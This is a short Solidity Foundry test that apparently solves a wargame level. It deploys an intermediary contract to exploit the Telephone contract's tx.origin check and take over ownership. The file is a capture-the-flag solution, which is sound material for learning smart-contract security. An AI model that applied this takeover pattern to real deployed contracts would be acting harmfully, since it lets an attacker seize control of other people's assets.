// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "../instance/Level04.sol";
import "forge-std/Test.sol";

contract ExploitLevel04 is Test {
    Telephone instance = new Telephone();

    function testExploit() external {
        Intermediary intermediary = new Intermediary(instance);

        vm.broadcast();
        intermediary.ring();

        assertEq(instance.owner(), msg.sender);
    }
}

contract Intermediary {
    Telephone instance;

    constructor(Telephone _instance) {
        instance = _instance;
    }

    function ring() external {
        instance.changeOwner(msg.sender);
    }
}
